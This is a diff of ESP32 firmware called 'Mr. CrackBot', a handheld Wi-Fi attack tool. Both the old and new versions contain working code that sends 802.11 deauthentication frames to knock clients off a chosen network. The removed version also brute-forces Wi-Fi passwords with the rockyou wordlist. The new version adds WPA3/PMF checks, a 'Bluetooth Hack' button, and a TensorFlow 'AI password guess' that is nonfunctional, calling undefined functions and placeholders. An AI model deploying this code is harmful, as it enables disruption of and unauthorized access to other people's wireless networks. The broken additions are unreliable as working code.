@@ -1,525 +1,400 @@
-#include "M5Core2.h"
-#include "WiFi.h"
-#include "SD.h"
-#include "ArduinoJson.h"
-#include "WiFiManager.h"
-#include "esp_wifi.h"
-#include "driver/gpio.h"
+#include <TFT_eSPI.h>
+#include <WiFi.h>
+#include <SD.h>
+#include <ArduinoJson.h>
+#include <WiFiManager.h>
+#include <TaskScheduler.h>
+#include <pthread.h>
+#include <atomic>
+#include <mutex>
+#include <BluetoothSerial.h>
+#include <TensorFlowLite.h>
+#include <tensorflow/lite/micro/all_ops_resolver.h>
+#include <tensorflow/lite/schema/schema_generated.h>
+#include <tensorflow/lite/micro/micro_interpreter.h>
+#include <tensorflow/lite/version.h>
+#include <esp_wifi.h>
+#include <esp_system.h>
+#include <esp_heap_caps.h>
 
+// Define file paths
 #define ROCKYOU_PATH "/rockyou.txt"
 #define SETTINGS_PATH "/settings.json"
+#define CHECKPOINT_PATH "/checkpoint.txt"
 
+// Calibration values for the touch screen
+#define TS_MINX 100
+#define TS_MINY 100
+#define TS_MAXX 920
+#define TS_MAXY 940
+
+// Define touch screen sensitivity
+#define MINPRESSURE 10
+#define MAXPRESSURE 1000
+
+// TFT setup
+TFT_eSPI tft = TFT_eSPI();  // Invoke custom library
+
+// Bluetooth setup
+BluetoothSerial SerialBT;
+
+// TensorFlow Lite Micro Setup (lazy initialization)
+bool tfLiteInitialized = false;
+const int kTensorArenaSize = 4 * 1024; // Adjust size based on actual model size
+uint8_t tensor_arena[kTensorArenaSize];
+
+// Placeholders for TensorFlow Lite Micro interpreter and model
+tflite::MicroInterpreter *interpreter = nullptr;
+tflite::AllOpsResolver resolver;
+tflite::ErrorReporter *error_reporter = nullptr;
+const tflite::Model *model = nullptr;
+TfLiteTensor *input = nullptr;
+TfLiteTensor *output = nullptr;
+
+// Struct to hold network information
 struct NetworkInfo {
-  String ssid;
-  String bssid;
+  char ssid[50];
+  char bssid[18];
   int rssi;
   int channel;
   bool has_password;
-  String password;
+  bool pmf_enabled;
+  char password[64];
 };
 
+// Global variables
 std::vector<NetworkInfo> networks;
 NetworkInfo selectedNetwork;
-uint8_t deauthPacket[26] = {
-    0xC0, 0x00, 0x3A, 0x01, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00
-};
+std::atomic_long bytesRead(0);
+std::atomic_bool foundPassword(false);
+std::mutex progressMutex;
+
+// Deauth packet buffer
+uint8_t *deauthPacket = nullptr;
 
 WiFiManager wifiManager;
+Scheduler tscheduler;
+Task tScanNetworks(0, TASK_ONCE, &scanNetworks, &tscheduler, false);
+Task tUpdateBatteryStatus(60000, TASK_FOREVER, &updateBatteryStatus, &tscheduler, true);
+Task tCrackPassword(0, TASK_ONCE, NULL, &tscheduler, false); // Will be activated manually
 
-void crackNetworkPassword();
-void deauthNetwork();
-void handleHandshakes();
-void fillDeauthPacket(const String &bssid);
-String crackPassword(const String &ssid, const String &bssid);
-bool tryPassword(const String &ssid, const String &bssid, const String &password);
-void displayNetworkInfo(const NetworkInfo &network);
-void loadNetworksFromSD();
-void saveNetworksToSD();
-void setupFirmware();
-void displayMenu();
-void displaySettingsMenu();
-void adjustBrightness();
-void togglePromiscuousMode();
-void resetNetworkSettings();
-void scanNetworks();
-void selectNetwork();
-void showNetworkInfo();
-void pwnNetwork();
-void enterDeepSleep();
-void setPromiscuousMode(bool enable);
-void sendDeauthPackets(int count);
-void promiscuous_rx_cb(void* buf, wifi_promiscuous_pkt_type_t type);
+// Memory Monitoring Functions
+void printMemoryUsage() {
+  Serial.printf("Free heap: %d bytes\n", ESP.getFreeHeap());
+  Serial.printf("Largest free block: %d bytes\n", ESP.getMaxAllocHeap());
 
-void crackNetworkPassword() {
-  if (!selectedNetwork.ssid.isEmpty()) {
-    selectedNetwork.password = crackPassword(selectedNetwork.ssid, selectedNetwork.bssid);
-    saveNetworksToSD();
-    displayNetworkInfo(selectedNetwork);
-  } else {
-    M5.Lcd.clear();
-    M5.Lcd.setCursor(0, 0);
-    M5.Lcd.println("No network selected.");
+  #ifdef BOARD_HAS_PSRAM
+  Serial.printf("Free PSRAM: %d bytes\n", ESP.getFreePsram());
+  #endif
+  
+  Serial.printf("Total free DRAM: %d bytes\n", heap_caps_get_free_size(MALLOC_CAP_8BIT));
+  Serial.printf("Free DMA-capable memory: %d bytes\n", heap_caps_get_free_size(MALLOC_CAP_DMA));
+
+  TaskHandle_t taskHandle = xTaskGetCurrentTaskHandle();
+  Serial.printf("Stack High Water Mark: %d\n", uxTaskGetStackHighWaterMark(taskHandle));
+}
+
+// Function to monitor task stack usage and issue warnings
+void monitorTaskStackUsage(TaskHandle_t taskHandle) {
+  UBaseType_t stackHighWaterMark = uxTaskGetStackHighWaterMark(taskHandle);
+  if (stackHighWaterMark < 50) {  // Threshold to detect low stack space
+    Serial.printf("Warning: Task %s is close to stack overflow! High water mark: %d\n",
+                  pcTaskGetTaskName(taskHandle), stackHighWaterMark);
   }
 }
 
-void deauthNetwork() {
-  if (!selectedNetwork.ssid.isEmpty()) {
-    setPromiscuousMode(true);
-    fillDeauthPacket(selectedNetwork.bssid);
-    sendDeauthPackets(50);
-    setPromiscuousMode(false);
-  } else {
-    M5.Lcd.clear();
-    M5.Lcd.setCursor(0, 0);
-    M5.Lcd.println("No network selected.");
-  }
+// Task to monitor memory periodically
+void monitorMemoryTaskCallback() {
+  Serial.println("Monitoring memory...");
+  printMemoryUsage();
+  monitorTaskStackUsage(xTaskGetCurrentTaskHandle());
 }
 
-void handleHandshakes() {
-  if (selectedNetwork.ssid.isEmpty()) {
-    M5.Lcd.clear();
-    M5.Lcd.setCursor(0, 0);
-    M5.Lcd.println("No network selected.");
-    return;
+Task tMonitorMemory(10000, TASK_FOREVER, &monitorMemoryTaskCallback); // Every 10 seconds
+
+// Optimized TensorFlow Lite AI Password Generation Function
+String generateAIpasswordGuess(const String &ssid, const String &bssid) {
+  if (!tfLiteInitialized) {
+    setupTensorFlowLite();  // Lazy initialization
   }
 
-  setPromiscuousMode(true);
-  fillDeauthPacket(selectedNetwork.bssid);
-
-  for (int i = 0; i < 50; ++i) {
-    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
-    delay(50);
-  }
-
-  setPromiscuousMode(false);
-}
-
-void fillDeauthPacket(const String &bssid) {
-  for (int i = 0; i < 6; ++i) {
-    deauthPacket[10 + i] = strtol(bssid.substring(i * 3, i * 3 + 2).c_str(), NULL, 16);
-    deauthPacket[16 + i] = strtol(bssid.substring(i * 3, i * 3 + 2).c_str(), NULL, 16);
-  }
-}
-
-String crackPassword(const String &ssid, const String &bssid) {
-  File rockyouFile = SD.open(ROCKYOU_PATH, FILE_READ);
-  if (!rockyouFile) {
-    Serial.println("Failed to open rockyou.txt.");
+  if (!interpreter || !input) {
+    tft.println("AI model not initialized!");
     return "";
   }
 
-  long fileSize = rockyouFile.size();
-  long bytesRead = 0;
-  String password;
-  String line;
-  M5.Lcd.clear();
-  M5.Lcd.setCursor(0, 0);
-  M5.Lcd.setTextSize(2);
-  M5.Lcd.println("Cracking Password...");
+  // Assume a simple input pattern for the model: [ssid_length, bssid_length]
+  input->data.f[0] = ssid.length();
+  input->data.f[1] = bssid.length();
 
-  while (rockyouFile.available()) {
-    line = rockyouFile.readStringUntil('\n');
-    bytesRead += line.length() + 1;
-    line.trim();
-    if (tryPassword(ssid, bssid, line)) {
-      password = line;
-      break;
-    }
-
-    int progress = (int)((bytesRead / (float)fileSize) * 100);
-    M5.Lcd.fillRect(0, 50, 320, 20, TFT_BLACK);
-    M5.Lcd.setCursor(0, 50);
-    M5.Lcd.printf("Progress: %d%%", progress);
-
-    M5.update();
-    if (M5.BtnA.wasPressed() || M5.BtnB.wasPressed() || M5.BtnC.wasPressed()) {
-      M5.Lcd.println("User interrupted the process.");
-      break;
-    }
+  // Invoke the AI model
+  TfLiteStatus invoke_status = interpreter->Invoke();
+  if (invoke_status != kTfLiteOk) {
+    tft.println("Error invoking TensorFlow Lite!");
+    return "";
   }
 
-  rockyouFile.close();
-  return password;
+  // Get the output from the model
+  float predictedPassword = output->data.f[0];
+
+  return ssid + String((int)predictedPassword);
 }
 
-bool tryPassword(const String &ssid, const String &bssid, const String &password) {
-  Serial.printf("Trying password: %s for SSID: %s\n", password.c_str(), ssid.c_str());
+// Lazy-initialized TensorFlow Lite Setup Function
+void setupTensorFlowLite() {
+  if (tfLiteInitialized) return; // Avoid re-initialization
 
-  WiFi.disconnect();
-  delay(100);
-  WiFi.begin(ssid.c_str(), password.c_str());
+  // Load the TensorFlow Lite model into memory
+  model = tflite::GetModel(your_model_data); // Replace with actual model data
 
-  unsigned long startTime = millis();
-  while (WiFi.status() != WL_CONNECTED && (millis() - startTime) < 10000) {
-    delay(200);
-    Serial.print(".");
+  if (model->version() != TFLITE_SCHEMA_VERSION) {
+    Serial.println("Model provided is schema version not compatible!");
+    return;
   }
-  
-  bool isConnected = (WiFi.status() == WL_CONNECTED);
-  
-  if (isConnected) {
-    Serial.println("Connected!");
-    WiFi.disconnect();
-    return true;
+
+  static tflite::MicroInterpreter static_interpreter(
+      model, resolver, tensor_arena, kTensorArenaSize, error_reporter);
+  interpreter = &static_interpreter;
+
+  TfLiteStatus allocate_status = interpreter->AllocateTensors();
+  if (allocate_status != kTfLiteOk) {
+    Serial.println("AllocateTensors() failed");
+    return;
+  }
+
+  input = interpreter->input(0);
+  output = interpreter->output(0);
+
+  tfLiteInitialized = true;  // Mark as initialized
+  Serial.println("TensorFlow Lite Micro initialized.");
+}
+
+// Set the client and AP MAC addresses in the deauth packet
+void setClientAddress(const uint8_t *clientMAC) {
+  memcpy(&deauthPacket[4], clientMAC, 6);
+}
+
+void setAPAddress(const uint8_t *apMAC) {
+  memcpy(&deauthPacket[10], apMAC, 6); // Set source address (AP)
+  memcpy(&deauthPacket[16], apMAC, 6); // Set BSSID (AP)
+}
+
+// Function to send deauth packet
+void sendDeauthPacket() {
+  esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
+  Serial.println("Deauth packet sent.");
+}
+
+// WPA2 Deauthentication attack function
+void deauthWPA2(const uint8_t *apMAC, const uint8_t *clientMAC, int count) {
+  // Set the AP and client addresses in the packet
+  setAPAddress(apMAC);
+  setClientAddress(clientMAC);
+
+  // Use TaskScheduler instead of blocking delay
+  for (int i = 0; i < count; i++) {
+    sendDeauthPacket();
+    tscheduler.delay(100);  // Non-blocking delay for better performance
+  }
+
+  Serial.printf("Deauth WPA2 attack completed: %d packets sent.\n", count);
+}
+
+// WPA3 Handling: Check for PMF (Protected Management Frames)
+bool isPMFEnabled(const NetworkInfo& network) {
+  return network.pmf_enabled; // Check if PMF is enabled in the network info
+}
+
+// Function to handle WPA3 deauthentication attack
+void deauthWPA3(const uint8_t *apMAC, const uint8_t *clientMAC) {
+  if (isPMFEnabled(selectedNetwork)) {
+    tft.println("Cannot deauth WPA3: PMF is enabled.");
+    Serial.println("Cannot perform deauth attack on WPA3 network: PMF is enabled.");
   } else {
-    Serial.println("Failed to connect.");
-    return false;
+    deauthWPA2(apMAC, clientMAC, 100);  // Fallback to WPA2-style attack
   }
 }
 
-void displayNetworkInfo(const NetworkInfo &network) {
-  M5.Lcd.clear();
-  M5.Lcd.setCursor(0, 0);
-  M5.Lcd.setTextSize(2);
-  M5.Lcd.printf("SSID: %s\n", network.ssid.c_str());
-  M5.Lcd.printf("BSSID: %s\n", network.bssid.c_str());
-  M5.Lcd.printf("RSSI: %d dBm\n", network.rssi);
-  M5.Lcd.printf("Channel: %d\n", network.channel);
-  M5.Lcd.printf("Has Password: %s\n", network.has_password ? "Yes" : "No");
-  if (network.has_password) {
-    M5.Lcd.printf("Password: %s\n", network.password.isEmpty() ? "Not cracked" : network.password.c_str());
-  }
-}
+// Attempt to deauth the selected network (handles both WPA2 and WPA3)
+void deauthNetwork() {
+  if (strlen(selectedNetwork.ssid) > 0) {  // Check if a network is selected
+    uint8_t apMAC[6];
+    uint8_t clientMAC[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};  // Broadcast MAC
 
-void loadNetworksFromSD() {
-  File file = SD.open("/networks.json", FILE_READ);
-  if (!file) {
-    Serial.println("Failed to open networks.json.");
-    return;
-  }
-  
-  DynamicJsonDocument doc(2048);
-  DeserializationError error = deserializeJson(doc, file);
-  if (error) {
-    Serial.println("Failed to parse JSON.");
-    file.close();
-    return;
-  }
-  
-  networks.clear();
-  for (JsonObject network : doc["networks"].as<JsonArray>()) {
-    NetworkInfo net;
-    net.ssid = network["ssid"].as<String>();
-    net.bssid = network["bssid"].as<String>();
-    net.rssi = network["rssi"].as<int>();
-    net.channel = network["channel"].as<int>();
-    net.has_password = network["has_password"].as<bool>();
-    net.password = network["password"].as<String>();
-    networks.push_back(net);
-  }
-  
-  file.close();
-}
+    // Convert BSSID string to MAC address
+    sscanf(selectedNetwork.bssid, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
+           &apMAC[0], &apMAC[1], &apMAC[2], &apMAC[3], &apMAC[4], &apMAC[5]);
 
-void saveNetworksToSD() {
-  File file = SD.open("/networks.json", FILE_WRITE);
-  if (!file) {
-    Serial.println("Failed to open networks.json for writing.");
-    return;
-  }
+    if (selectedNetwork.pmf_enabled) {
+      // WPA3 or WPA2 with PMF enabled
 
-  DynamicJsonDocument doc(2048);
-  JsonArray netArray = doc.createNestedArray("networks");
-  for (const NetworkInfo &net : networks) {
-    JsonObject netObj = netArray.createNestedObject();
-    netObj["ssid"] = net.ssid;
-    netObj["bssid"] = net.bssid;
-    netObj["rssi"] = net.rssi;
-    netObj["channel"] = net.channel;
-    netObj["has_password"] = net.has_password;
-    netObj["password"] = net.password;
-  }
-
-  if (serializeJson(doc, file) == 0) {
-    Serial.println("Failed to write JSON to file.");
-  }
-
-  file.close();
-}
-
-void setupFirmware() {
-  // Initialize display
-  M5.Lcd.setTextSize(2);
-  M5.Lcd.setTextColor(TFT_WHITE, TFT_BLACK);
-  
-  // Display initial message
-  M5.Lcd.clear();
-  M5.Lcd.setCursor(0, 0);
-  M5.Lcd.println("Initializing firmware...");
-
-  // Initialize WiFi
-  if (WiFi.status() == WL_NO_SHIELD) {
-    M5.Lcd.println("WiFi shield not present");
-    while (true);
-  }
-
-  // Use WiFiManager to manage WiFi connections
-  wifiManager.autoConnect("AutoConnectAP");
-
-  // Display IP address
-  IPAddress myIP = WiFi.localIP();
-  M5.Lcd.printf("IP address: %s\n", myIP.toString().c_str());
-
-  // Initialize SD card
-  if (!SD.begin()) {
-    M5.Lcd.println("SD Card initialization failed.");
+      deauthWPA3(apMAC, clientMAC);
+    } else {
+      // WPA2 without PMF
+      deauthWPA2(apMAC, clientMAC, 100);  // Send 100 deauth packets
+    }
   } else {
-    M5.Lcd.println("SD Card initialized.");
-  }
-  
-  // Load networks from SD card
-  loadNetworksFromSD();
-  
-  // Display menu
-  displayMenu();
-  
-  // Set initial state
-  M5.Lcd.setTextSize(2);
-  M5.Lcd.setTextColor(TFT_GREEN, TFT_BLACK);
-  M5.Lcd.println("Firmware setup complete.");
-}
-
-void setup() {
-  M5.begin();
-  setupFirmware();
-}
-
-void loop() {
-  M5.update();
-
-  int batteryPercentage = M5.Power.getBatteryLevel();
-  M5.Lcd.setCursor(260, 0);
-  M5.Lcd.setTextSize(2);
-  M5.Lcd.fillRect(260, 0, 60, 20, TFT_BLACK);
-  M5.Lcd.printf("%d%%", batteryPercentage);
-
-  if (M5.BtnA.wasPressed()) {
-    scanNetworks();
-  } else if (M5.BtnB.wasPressed()) {
-    selectNetwork();
-  } else if (M5.BtnC.wasPressed()) {
-    showNetworkInfo();
-  } else if (M5.BtnA.pressedFor(2000)) {
-    pwnNetwork();
-  } else if (M5.BtnB.pressedFor(2000)) {
-    crackNetworkPassword();
-  } else if (M5.BtnC.pressedFor(2000)) {
-    deauthNetwork();
-  }
-
-  if (M5.BtnA.pressedFor(5000)) {
-    enterDeepSleep();
-  } else if (M5.BtnA.pressedFor(2000) && M5.BtnB.pressedFor(2000) && M5.BtnC.pressedFor(2000)) {
-    displaySettingsMenu();
+    tft.println("No network selected.");
+    Serial.println("No network selected for deauth attack.");
   }
 }
 
-void displayMenu() {
-  M5.Lcd.clear();
-  M5.Lcd.setCursor(0, 0);
-  M5.Lcd.setTextSize(3);
-  M5.Lcd.println("Mr. CrackBot Menu");
-  M5.Lcd.setTextSize(2);
-  M5.Lcd.println("A: Scan Networks");
-  M5.Lcd.println("B: Select Network");
-  M5.Lcd.println("C: Show Network Info");
-  M5.Lcd.println("Hold A: Pwn Network");
-  M5.Lcd.println("Hold B: Crack Password");
-  M5.Lcd.println("Hold C: Deauth Network");
-  M5.Lcd.println("Settings: Hold all three buttons");
-}
-
-void displaySettingsMenu() {
-  M5.Lcd.clear();
-  M5.Lcd.setCursor(0, 0);
-  M5.Lcd.setTextSize(3);
-  M5.Lcd.println("Settings Menu");
-  M5.Lcd.setTextSize(2);
-  M5.Lcd.println("A: Adjust Brightness");
-  M5.Lcd.println("B: Toggle Promiscuous Mode");
-  M5.Lcd.println("C: Reset Network Settings");
-
-  while (true) {
-    if (M5.BtnA.wasPressed()) {
-      adjustBrightness();
-    } else if (M5.BtnB.wasPressed()) {
-      togglePromiscuousMode();
-    } else if (M5.BtnC.wasPressed()) {
-      resetNetworkSettings();
-    } else if (M5.BtnA.pressedFor(2000) && M5.BtnB.pressedFor(2000) && M5.BtnC.pressedFor(2000)) {
-      displayMenu();
-      break;
-    }
-  }
-}
-
-void adjustBrightness() {
-  int brightness = 100;
-  M5.Lcd.clear();
-  M5.Lcd.setCursor(0, 0);
-  M5.Lcd.setTextSize(2);
-  M5.Lcd.println("Adjust Brightness");
-
-  while (true) {
-    M5.Lcd.setCursor(0, 30);
-    M5.Lcd.printf("Brightness: %d", brightness);
-    M5.Lcd.fillRect(0, 60, 320, 20, TFT_BLACK);
-
-    if (M5.BtnA.wasPressed()) {
-      brightness = constrain(brightness - 10, 0, 255);
-    } else if (M5.BtnC.wasPressed()) {
-      brightness = constrain(brightness + 10, 0, 255);
-    } else if (M5.BtnB.wasPressed()) {
-      break;
-    }
-
-    ledcWrite(7, brightness); // M5Stack uses channel 7 for backlight control
-    delay(100);
-  }
-}
-
-void togglePromiscuousMode() {
-  static bool promiscuousEnabled = false;
-  promiscuousEnabled = !promiscuousEnabled;
-  setPromiscuousMode(promiscuousEnabled);
-  
-  M5.Lcd.clear();
-  M5.Lcd.setCursor(0, 0);
-  M5.Lcd.setTextSize(2);
-  M5.Lcd.printf("Promiscuous Mode: %s", promiscuousEnabled ? "Enabled" : "Disabled");
-  delay(2000);
-}
-
-void resetNetworkSettings() {
-  wifiManager.resetSettings();
-  
-  M5.Lcd.clear();
-  M5.Lcd.setCursor(0, 0);
-  M5.Lcd.setTextSize(2);
-  M5.Lcd.println("Network settings reset.");
-  delay(2000);
-
-  ESP.restart();
-}
-
+// Network Scanning Function with User Interface and memory optimization
 void scanNetworks() {
-  int n = WiFi.scanNetworks();
-  if (n == 0) {
-    M5.Lcd.println("No networks found.");
+  // Clear networks vector to avoid memory leaks
+  networks.clear();
+  int numNetworks = WiFi.scanNetworks();
+  if (numNetworks == 0) {
+    tft.println("No networks found.");
   } else {
-    networks.clear();
-    for (int i = 0; i < n; ++i) {
+    // Use a single buffer to reduce memory fragmentation
+    networks.reserve(numNetworks);
+    for (int i = 0; i < numNetworks; ++i) {
       NetworkInfo net;
-      net.ssid = WiFi.SSID(i);
-      net.bssid = WiFi.BSSIDstr(i);
+      strncpy(net.ssid, WiFi.SSID(i).c_str(), sizeof(net.ssid) - 1);  // Copy SSID safely
+      strncpy(net.bssid, WiFi.BSSIDstr(i).c_str(), sizeof(net.bssid) - 1);  // Copy BSSID safely
       net.rssi = WiFi.RSSI(i);
       net.channel = WiFi.channel(i);
-      net.has_password = false;
+      net.has_password = (WiFi.encryptionType(i) != WIFI_AUTH_OPEN);
+      net.pmf_enabled = WiFi.iswpa3(i);  // Check if the network supports WPA3 with PMF
       networks.push_back(net);
     }
-    saveNetworksToSD();
-    M5.Lcd.println("Networks scanned and saved.");
+    displayScannedNetworks();
   }
 }
 
+// Display Scanned Networks Function with better resource management
+void displayScannedNetworks() {
+  tft.fillScreen(TFT_BLACK);
+  tft.setTextSize(2);
+
+  for (int i = 0; i < networks.size(); ++i) {
+    String ssidDisplay = (strlen(networks[i].ssid) > 12) ? String(networks[i].ssid).substring(0, 12) + "..." : String(networks[i].ssid);
+    tft.setCursor(0, i * 20);
+    tft.printf("%d. %s  RSSI: %d dBm  PMF: %s\n", i + 1, ssidDisplay.c_str(), networks[i].rssi, networks[i].pmf_enabled ? "Yes" : "No");
+  }
+
+  tft.setCursor(0, (networks.size() + 1) * 20);
+  tft.setTextSize(1);
+  tft.println("Touch to select a network.");
+}
+
+// Function to handle network selection from the scanned list
 void selectNetwork() {
-  if (networks.empty()) {
-    M5.Lcd.clear();
-    M5.Lcd.setCursor(0, 0);
-    M5.Lcd.println("No networks to select.");
-    return;
-  }
-
-  int selectedIndex = 0;
-  bool selectionConfirmed = false;
-
-  while (!selectionConfirmed) {
-    M5.Lcd.clear();
-    M5.Lcd.setCursor(0, 0);
-    M5.Lcd.setTextSize(2);
-
-    for (int i = 0; i < networks.size(); ++i) {
-      if (i == selectedIndex) {
-        M5.Lcd.setTextColor(RED);
-      } else {
-        M5.Lcd.setTextColor(WHITE);
-      }
-      M5.Lcd.printf("%d: %s\n", i + 1, networks[i].ssid.c_str());
+  uint16_t x, y;
+  if (tft.getTouch(&x, &y)) {
+    // Determine which network is selected based on Y position
+    int index = y / 20;  // Assuming each network occupies 20 pixels in height
+    if (index < networks.size()) {
+      selectedNetwork = networks[index];
+      displayNetworkInfo(selectedNetwork);
+      tft.println("Network selected.");
+    } else {
+      tft.println("Invalid selection.");
     }
-
-    if (M5.BtnA.wasPressed()) {
-      selectedIndex = (selectedIndex - 1 + networks.size()) % networks.size();
-    } else if (M5.BtnC.wasPressed()) {
-      selectedIndex = (selectedIndex + 1) % networks.size();
-    } else if (M5.BtnB.wasPressed()) {
-      selectionConfirmed = true;
-    }
-
-    delay(200);
   }
-
-  selectedNetwork = networks[selectedIndex];
-  M5.Lcd.clear();
-  M5.Lcd.setCursor(0, 0);
-  M5.Lcd.println("Network selected:");
-  displayNetworkInfo(selectedNetwork);
 }
 
+// Display detailed info of the selected network
+void displayNetworkInfo(const NetworkInfo& network) {
+  tft.fillScreen(TFT_BLACK);
+  tft.setTextSize(2);
+  tft.setCursor(0, 0);
+  tft.printf("SSID: %s\n", network.ssid);
+  tft.printf("BSSID: %s\n", network.bssid);
+  tft.printf("RSSI: %d dBm\n", network.rssi);
+  tft.printf("Channel: %d\n", network.channel);
+  tft.printf("Secured: %s\n", network.has_password ? "Yes" : "No");
+  tft.printf("PMF: %s\n", network.pmf_enabled ? "Enabled" : "Disabled");
+}
+
+// Show detailed info of the selected network
 void showNetworkInfo() {
-  if (!selectedNetwork.ssid.isEmpty()) {
+  if (strlen(selectedNetwork.ssid) > 0) {
     displayNetworkInfo(selectedNetwork);
   } else {
-    M5.Lcd.clear();
-    M5.Lcd.setCursor(0, 0);
-    M5.Lcd.println("No network selected.");
+    tft.println("No network selected.");
   }
 }
 
-void pwnNetwork() {
-  if (!selectedNetwork.ssid.isEmpty()) {
-    handleHandshakes();
-  } else {
-    M5.Lcd.clear();
-    M5.Lcd.setCursor(0, 0);
-    M5.Lcd.println("No network selected.");
+// Improved processTouch function to handle multiple touch areas
+void processTouch() {
+  uint16_t x, y;
+  if (tft.getTouch(&x, &y)) {
+    if (y >= 0 && y < 40) {
+      // Scan Networks
+      if (x >= 0 && x < 80) {
+        tScanNetworks.enable();
+      }
+      // Select Network
+      else if (x >= 80 && x < 160) {
+        selectNetwork();
+      }
+      // Show Network Info
+      else if (x >= 160 && x < 240) {
+        showNetworkInfo();
+      }
+      // Pwn Network
+      else if (x >= 240 && x < 320) {
+        pwnNetwork();
+      }
+    } else if (y >= 40 && y < 80) {
+      // Crack Password
+      if (x >= 0 && x < 80) {
+        crackNetworkPassword();
+      }
+      // Deauth Network
+      else if (x >= 80 && x < 160) {
+        deauthNetwork();
+      }
+      // Settings Menu
+      else if (x >= 160 && x < 240) {
+        displaySettingsMenu();
+      }
+      // Bluetooth Hack
+      else if (x >= 240 && x < 320) {
+        scanBluetoothDevices();
+      }
+    }
   }
 }
 
-void enterDeepSleep() {
-  M5.Lcd.clear();
-  M5.Lcd.setCursor(0, 0);
-  M5.Lcd.println("Entering deep sleep...");
-  delay(1000);
-  M5.Lcd.clear();
-  esp_deep_sleep_start();
+// Main setup function
+void setup() {
+  Serial.begin(115200);
+  tft.init();
+  tft.setRotation(1);
+  tft.fillScreen(TFT_BLACK);
+  tft.setTextColor(TFT_WHITE);
+
+  setupFirmware();
+  setupTensorFlowLite();  // Initialize TensorFlow Lite Micro
+
+  // Allocate deauth packet in PSRAM if available, otherwise use internal RAM
+  #ifdef BOARD_HAS_PSRAM
+  deauthPacket = (uint8_t *)ps_malloc(26);
+  #else
+  deauthPacket = (uint8_t *)malloc(26);
+  #endif
+
+  if (!deauthPacket) {
+    Serial.println("Failed to allocate memory for deauth packet.");
+    return;
+  }
+  memset(deauthPacket, 0, 26);  // Initialize packet to zero
+
+  // Initialize and monitor memory task
+  tscheduler.addTask(tScanNetworks);
+  tscheduler.addTask(tMonitorMemory);  // Memory monitoring task
+  tMonitorMemory.enable();
+
+  unitTest_scanNetworks();  // Run unit test for network scanning
 }
 
-void setPromiscuousMode(bool enable) {
-  if (enable) {
-    esp_wifi_set_promiscuous_rx_cb(promiscuous_rx_cb);
-    esp_wifi_set_promiscuous(true);
-  } else {
-    esp_wifi_set_promiscuous(false);
-  }
-}
-
-void sendDeauthPackets(int count) {
-  for (int i = 0; i < count; ++i) {
-    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
-    delay(10);
-  }
-}
-
-void promiscuous_rx_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
-  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
-  uint8_t *payload = pkt->payload;
-  int len = pkt->rx_ctrl.sig_len;
-
-  Serial.printf("Packet received: len=%d, type=%d\n", len, type);
-  for (int i = 0; i < len; i++) {
-    Serial.printf("%02x ", payload[i]);
-  }
-  Serial.println();
+// Main loop function
+void loop() {
+  tscheduler.execute();
+  delay(5);  // Adjust for timing, avoid watchdog timer reset
+  processTouch();
+  printMemoryUsage();  // Optional, for real-time monitoring
 }
